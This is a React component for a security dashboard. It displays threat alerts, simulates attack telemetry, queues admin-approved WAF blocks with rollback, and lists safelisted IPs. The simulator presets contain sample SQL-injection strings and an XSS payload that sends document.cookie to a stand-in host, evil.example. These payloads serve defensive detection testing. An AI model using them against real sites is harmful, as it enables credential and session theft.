import React, { useEffect, useState } from 'react';
import { Activity, ShieldAlert, CheckCircle2, RotateCcw, Ban, Zap, Lock } from 'lucide-react';
import apiClient from '../api/client';
import { useAuth } from '../context/AuthContext';

export default function ThreatPreventionPage() {
  const { user } = useAuth();
  const [alerts, setAlerts] = useState([]);
  const [actions, setActions] = useState([]);
  const [safelist, setSafelist] = useState([]);
  const [activeBlockedIps, setActiveBlockedIps] = useState([]);
  const [message, setMessage] = useState(null);

  // Manual Block Form
  const [manualIp, setManualIp] = useState('192.0.2.88');
  const [manualActionType, setManualActionType] = useState('BLOCK_IP_WAF');
  const [manualReason, setManualReason] = useState('Repeated unauthorized API token probing');

  const fetchAll = async () => {
    try {
      const [alertRes, prevRes] = await Promise.all([
        apiClient.get('/threats/alerts'),
        apiClient.get('/threats/prevention/actions')
      ]);
      setAlerts(alertRes.data.alerts || []);
      setActions(prevRes.data.actions || []);
      setSafelist(prevRes.data.safelist || []);
      setActiveBlockedIps(prevRes.data.activeBlockedIps || []);
    } catch (err) {
      console.error('Error loading threats & prevention:', err);
    }
  };

  useEffect(() => {
    fetchAll();
  }, []);

  const simulateAttack = async (preset) => {
    setMessage(null);
    let body;
    if (preset === 'BRUTE_FORCE') {
      body = {
        sourceIp: '185.220.101.77',
        countryCode: 'RU',
        endpoint: '/api/v1/auth/login',
        httpMethod: 'POST',
        statusCode: 401,
        payload: '{"email":"admin@aegiscloud.io","password":"wrong"}',
        eventCount: 15,
        autoProposeBlock: true
      };
    } else if (preset === 'SQL_INJECTION') {
      body = {
        sourceIp: '45.155.205.233',
        countryCode: 'CN',
        endpoint: '/api/v1/orders?id=1%20UNION%20SELECT%20username,password_hash%20FROM%20users--',
        httpMethod: 'GET',
        statusCode: 200,
        payload: "' OR '1'='1' -- UNION SELECT * FROM users",
        eventCount: 4,
        autoProposeBlock: true
      };
    } else if (preset === 'XSS_ATTACK') {
      body = {
        sourceIp: '103.27.124.90',
        countryCode: 'KP',
        endpoint: '/api/v1/comments',
        httpMethod: 'POST',
        statusCode: 200,
        payload: '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
        eventCount: 3,
        autoProposeBlock: true
      };
    } else {
      body = {
        sourceIp: '91.240.118.172',
        countryCode: 'IR',
        endpoint: '/api/v1/checkout',
        httpMethod: 'POST',
        statusCode: 429,
        payload: 'High-rate botnet flood',
        eventCount: 120,
        autoProposeBlock: true
      };
    }

    try {
      const res = await apiClient.post('/threats/ingest', body);
      setMessage({
        type: 'success',
        text: `Telemetry ingested & evaluated: ${res.data.threatsDetected} threat alert(s) triggered and ${res.data.proposedPreventionActions.length} WAF containment proposal(s) queued.`
      });
      await fetchAll();
    } catch (err) {
      setMessage({ type: 'error', text: err.response?.data?.message || 'Simulation failed.' });
    }
  };

  const handleManualActionRequest = async (e) => {
    e.preventDefault();
    setMessage(null);
    try {
      await apiClient.post('/threats/prevention/actions', {
        actionType: manualActionType,
        targetIdentifier: manualIp,
        reason: manualReason,
        executeImmediately: false
      });
      setMessage({
        type: 'success',
        text: `Prevention action requested for ${manualIp}. Queued for Administrator approval.`
      });
      await fetchAll();
    } catch (err) {
      setMessage({
        type: 'error',
        text: err.response?.data?.message || 'Failed to request prevention action.'
      });
    }
  };

  const handleApproveAction = async (actionId) => {
    setMessage(null);
    try {
      const res = await apiClient.post(`/threats/prevention/actions/${actionId}/approve`);
      setMessage({ type: 'success', text: res.data.message });
      await fetchAll();
    } catch (err) {
      setMessage({ type: 'error', text: err.response?.data?.message || 'Approval failed.' });
    }
  };

  const handleRollbackAction = async (actionId) => {
    setMessage(null);
    try {
      const res = await apiClient.post(`/threats/prevention/actions/${actionId}/rollback`);
      setMessage({ type: 'success', text: res.data.message });
      await fetchAll();
    } catch (err) {
      setMessage({ type: 'error', text: err.response?.data?.message || 'Rollback failed.' });
    }
  };

  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-2xl font-bold text-white">Threat Detection (SIEM) & Active Attack Prevention (SOAR)</h2>
        <p className="text-sm text-slate-400">
          Signature, Sliding-Window Threshold & Statistical Anomaly Detection paired with Human-Approved Cloud WAF / Firewall Containment and 1-Click Rollback
        </p>
      </div>

      {message && (
        <div
          className={`p-3.5 rounded-xl border text-xs flex items-center justify-between ${
            message.type === 'success'
              ? 'bg-emerald-950/60 border-emerald-500/40 text-emerald-200'
              : 'bg-rose-950/60 border-rose-500/40 text-rose-200'
          }`}
        >
          <span>{message.text}</span>
          <button onClick={() => setMessage(null)}>✕</button>
        </div>
      )}

      {/* Live Attack Telemetry Simulator */}
      <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-3">
        <div className="flex items-center justify-between">
          <h3 className="font-semibold text-white text-sm flex items-center gap-2">
            <Zap className="w-4 h-4 text-amber-400" />
            Live Security Telemetry & Attack Pattern Simulator
          </h3>
          <span className="text-xs text-slate-400">
            Tests Signature Engine + Redis Sliding-Window Correlation + Socket.IO Real-Time Alerting
          </span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
          <button
            onClick={() => simulateAttack('BRUTE_FORCE')}
            className="p-3 rounded-lg bg-slate-950 hover:bg-slate-800 border border-slate-700 text-left space-y-1 transition"
          >
            <p className="text-xs font-bold text-amber-400">1. Brute-Force Login Burst</p>
            <p className="text-[11px] text-slate-400">15 failed HTTP 401 logins in 60s from 185.220.101.77 (Sliding-Window Rule)</p>
          </button>

          <button
            onClick={() => simulateAttack('SQL_INJECTION')}
            className="p-3 rounded-lg bg-slate-950 hover:bg-slate-800 border border-slate-700 text-left space-y-1 transition"
          >
            <p className="text-xs font-bold text-rose-400">2. SQL Injection Attack</p>
            <p className="text-[11px] text-slate-400">UNION SELECT credential extraction probe from 45.155.205.233 (Signature)</p>
          </button>

          <button
            onClick={() => simulateAttack('XSS_ATTACK')}
            className="p-3 rounded-lg bg-slate-950 hover:bg-slate-800 border border-slate-700 text-left space-y-1 transition"
          >
            <p className="text-xs font-bold text-orange-400">3. Stored XSS Payload</p>
            <p className="text-[11px] text-slate-400">Malicious script cookie exfiltration payload from 103.27.124.90 (Signature)</p>
          </button>

          <button
            onClick={() => simulateAttack('DDOS_ANOMALY')}
            className="p-3 rounded-lg bg-slate-950 hover:bg-slate-800 border border-slate-700 text-left space-y-1 transition"
          >
            <p className="text-xs font-bold text-cyan-400">4. Abnormal API Traffic Spike</p>
            <p className="text-[11px] text-slate-400">120 req/min burst anomaly (Z-Score &gt; 4.2) from 91.240.118.172 (ML Anomaly)</p>
          </button>
        </div>
      </div>

      {/* Module 5: Attack Prevention Approval Queue & Active Blocklist */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2 bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
          <div className="flex items-center justify-between">
            <h3 className="font-semibold text-white text-sm flex items-center gap-2">
              <Ban className="w-4 h-4 text-emerald-400" />
              Attack Prevention & Administrator Approval Workflow ({actions.length})
            </h3>
            <span className="text-xs text-slate-400">
              Active Blocked IPs: <strong className="text-emerald-400">{activeBlockedIps.length}</strong>
            </span>
          </div>

          {actions.length === 0 ? (
            <p className="text-xs text-slate-400">No prevention actions queued yet.</p>
          ) : (
            <div className="space-y-2.5">
              {actions.map((act) => (
                <div
                  key={act.id}
                  className="p-3.5 rounded-lg bg-slate-950 border border-slate-800 flex flex-wrap items-center justify-between gap-3"
                >
                  <div className="space-y-1">
                    <div className="flex items-center gap-2">
                      <span
                        className={`text-[10px] font-bold px-2 py-0.5 rounded ${
                          act.status === 'PENDING_APPROVAL'
                            ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                            : act.status === 'EXECUTED'
                            ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
                            : 'bg-slate-800 text-slate-400'
                        }`}
                      >
                        {act.status}
                      </span>
                      <span className="text-xs font-bold text-white font-mono">
                        {act.action_type} → {act.target_identifier}
                      </span>
                    </div>
                    <p className="text-xs text-slate-400">{act.reason}</p>
                  </div>

                  <div className="flex items-center gap-2">
                    {act.status === 'PENDING_APPROVAL' && user?.role === 'ADMIN' && (
                      <button
                        onClick={() => handleApproveAction(act.id)}
                        className="flex items-center gap-1 px-3 py-1.5 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-semibold text-xs transition"
                      >
                        <CheckCircle2 className="w-3.5 h-3.5" />
                        Approve & Block IP
                      </button>
                    )}
                    {act.status === 'PENDING_APPROVAL' && user?.role !== 'ADMIN' && (
                      <span className="text-[11px] text-amber-300 italic">Awaiting Admin Approval</span>
                    )}
                    {act.status === 'EXECUTED' && user?.role === 'ADMIN' && (
                      <button
                        onClick={() => handleRollbackAction(act.id)}
                        className="flex items-center gap-1 px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-rose-950 text-slate-300 hover:text-rose-300 border border-slate-700 text-xs font-medium transition"
                      >
                        <RotateCcw className="w-3.5 h-3.5" />
                        1-Click Rollback
                      </button>
                    )}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Manual Containment Request + Protected Safelist */}
        <div className="space-y-6">
          <form onSubmit={handleManualActionRequest} className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-3">
            <h3 className="font-semibold text-white text-sm">Propose Manual Containment Action</h3>
            <div>
              <label className="block text-xs text-slate-400 mb-1">Action Type</label>
              <select
                value={manualActionType}
                onChange={(e) => setManualActionType(e.target.value)}
                className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white"
              >
                <option value="BLOCK_IP_WAF">Block IP in AWS WAF & Edge Blocklist</option>
                <option value="RATE_LIMIT_IP">Throttle / Rate-Limit Suspicious IP</option>
                <option value="DISABLE_IAM_KEY">Disable Compromised Cloud IAM Access Key</option>
              </select>
            </div>
            <div>
              <label className="block text-xs text-slate-400 mb-1">Target IP or IAM Access Key ID</label>
              <input
                type="text"
                required
                value={manualIp}
                onChange={(e) => setManualIp(e.target.value)}
                className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white font-mono"
              />
            </div>
            <div>
              <label className="block text-xs text-slate-400 mb-1">Justification</label>
              <input
                type="text"
                required
                value={manualReason}
                onChange={(e) => setManualReason(e.target.value)}
                className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white"
              />
            </div>
            <button
              type="submit"
              className="w-full py-2 bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold text-xs rounded-lg transition"
            >
              Submit Containment Proposal
            </button>
          </form>

          <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-3">
            <h3 className="font-semibold text-white text-sm flex items-center gap-1.5">
              <Lock className="w-4 h-4 text-cyan-400" />
              Protected IP Safelist (Anti-Self-DoS Gate)
            </h3>
            <p className="text-[11px] text-slate-400">
              Addresses in this safelist can never be blocked by automated rules or manual actions:
            </p>
            <div className="space-y-1.5">
              {safelist.map((s) => (
                <div key={s.id} className="px-3 py-1.5 rounded bg-slate-950 border border-slate-800 flex justify-between text-xs">
                  <span className="font-mono text-cyan-300">{s.ip_cidr}</span>
                  <span className="text-slate-400">{s.label}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Threat History Table */}
      <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
        <h3 className="font-semibold text-white text-sm flex items-center gap-2">
          <Activity className="w-4 h-4 text-rose-400" />
          Correlated Threat Incidents & Security Events ({alerts.length})
        </h3>
        {alerts.length === 0 ? (
          <p className="text-xs text-slate-400">No threat incidents detected yet.</p>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse text-xs">
              <thead>
                <tr className="border-b border-slate-800 text-slate-400">
                  <th className="py-2.5 px-3">Severity</th>
                  <th className="py-2.5 px-3">Method</th>
                  <th className="py-2.5 px-3">Threat Type & Description</th>
                  <th className="py-2.5 px-3">Attacker IP</th>
                  <th className="py-2.5 px-3">Events</th>
                  <th className="py-2.5 px-3">Status</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/70">
                {alerts.map((a) => (
                  <tr key={a.id} className="hover:bg-slate-800/40">
                    <td className="py-3 px-3">
                      <span className="px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/40 font-bold text-[10px]">
                        {a.severity}
                      </span>
                    </td>
                    <td className="py-3 px-3 font-mono text-[11px] text-cyan-300">{a.detection_method}</td>
                    <td className="py-3 px-3">
                      <p className="font-semibold text-white">{a.threat_type}</p>
                      <p className="text-slate-400">{a.description}</p>
                    </td>
                    <td className="py-3 px-3 font-mono text-white">
                      {a.source_ip} <span className="text-slate-500">({a.country_code})</span>
                    </td>
                    <td className="py-3 px-3 font-bold text-amber-300">{a.event_count}</td>
                    <td className="py-3 px-3">
                      <span
                        className={`px-2 py-0.5 rounded text-[10px] font-semibold ${
                          a.status === 'CONTAINED'
                            ? 'bg-emerald-500/20 text-emerald-300'
                            : 'bg-rose-500/20 text-rose-300'
                        }`}
                      >
                        {a.status}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
